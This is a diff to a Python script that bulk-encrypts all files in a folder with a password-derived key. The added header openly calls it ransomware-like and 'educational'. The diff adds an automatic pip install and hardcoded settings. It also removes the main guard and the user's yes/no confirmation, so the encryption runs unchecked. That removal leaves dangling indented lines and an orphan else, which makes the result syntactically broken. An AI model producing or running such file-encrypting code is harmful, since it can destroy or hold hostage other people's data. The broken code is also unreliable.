@@ -1,7 +1,20 @@
+## This script simulates a ransomware-like behavior by bulk-encrypting all files in a specified folder using AES-256 encryption.
+## Please read through the code carefully before running it.
+## This is for educational purposes only.
+
+# Install the required dependency before running: pip install cryptography
+import subprocess
+import sys
+
+subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
+
 import os
 import base64
 from hashlib import sha256
 from cryptography.fernet import Fernet
+
+FOLDER_TO_ENCRYPT = "path/to/your/folder"  # Taken from your input, modify this to the folder you want to encrypt
+SECRET_PASSWORD = "your_secure_password"  # The ransomware will use this password to derive the encryption key
 
 def generate_key_from_password(password: str) -> bytes:
     """Derives a secure 32-byte key from a plain text password."""
@@ -40,17 +53,6 @@ def bulk_encrypt_folder(target_folder: str, password: str):
                 print(file_path, "-> Failed to encrypt:", str(e))
 
 # --- HOW TO RUN ---
-# 1. Open your terminal/command prompt and run: pip install cryptography
-# 2. Update the folder path and password variables below
-# 3. Run this script
-
-if __name__ == "__main__":
-    FOLDER_TO_ENCRYPT = input("Enter the folder path to encrypt: ").strip()
-    SECRET_PASSWORD = "YourSecurePasswordHere"
-    
-    # Warning check before running
-    confirm = input(f"Are you sure you want to bulk-encrypt all files in '{FOLDER_TO_ENCRYPT}'? (yes/no): ")
-    if confirm.lower() == 'yes':
         bulk_encrypt_folder(FOLDER_TO_ENCRYPT, SECRET_PASSWORD)
         print("\nBulk encryption process complete.")
     else:
